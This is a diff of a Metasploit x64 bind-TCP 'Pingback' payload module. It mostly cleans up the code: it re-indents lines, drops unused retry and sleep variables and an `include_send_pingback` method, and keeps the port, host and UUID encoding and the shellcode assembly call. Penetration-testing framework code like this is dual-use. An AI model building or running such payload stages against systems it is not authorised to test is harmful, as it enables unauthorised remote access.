@@ -27,22 +27,16 @@ module MetasploitModule
       'Arch'          => ARCH_X64,
       'Handler'       => Msf::Handler::BindTcp,
       'Session'       => Msf::Sessions::Pingback
-      ))
+    ))
     def generate_stage
       # 22 -> "0x00,0x16"
       # 4444 -> "0x11,0x5c"
       encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
-
       encoded_host = Rex::Socket.addr_aton("0.0.0.0").unpack("V").first
-      retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
-      pingback_count = datastore['PingbackRetries']
-      pingback_sleep = datastore['PingbackSleep']
-
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
       pingback_uuid ||= generate_pingback_uuid
       uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
       seconds = 5.0
-      sleep_seconds = seconds.to_i
       sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
       asm = %Q^
@@ -120,14 +114,8 @@ module MetasploitModule
           push   0x1
           pop    rdi
           syscall ; exit(1)
-
         ^
-      asm
-    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
-
+      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
+    end
   end
-  def include_send_pingback
-    true
-  end
-end
 end
